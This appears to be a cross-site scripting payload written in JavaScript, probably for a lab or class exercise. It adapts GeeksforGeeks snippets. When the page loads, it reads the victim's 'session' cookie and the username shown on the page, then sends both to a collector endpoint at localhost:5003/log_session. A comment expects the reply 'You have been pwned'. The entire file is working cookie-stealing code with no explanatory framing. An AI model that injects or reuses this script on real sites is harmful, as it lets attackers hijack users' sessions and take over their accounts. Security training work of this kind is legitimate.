// getCookieByName function from GeeksforGeeks:
// https://www.geeksforgeeks.org/how-to-get-cookie-by-name-in-javascript/
function getCookieByName(name) {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        cookie = cookie.trim();
        if (cookie.startsWith(name + '=')) {
            return cookie.substring(name.length + 1);
        }
    }
    return null;
}

// XMLHTTPRequest code adapted from GeeksforGeeks:
// https://www.geeksforgeeks.org/how-to-send-a-json-object-to-a-server-using-javascript/
window.addEventListener('load', function () {
    let xhr = new XMLHttpRequest();
    let url = "http://localhost:5003/log_session";
    let payload = {
        "user": document.querySelector("header > .post-username").innerText,
        "session": getCookieByName("session")
    };

    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {  // when readyState is DONE
            console.log(this.responseText);  // log "You have been pwned"
        }
    };
    xhr.send(JSON.stringify(payload));
});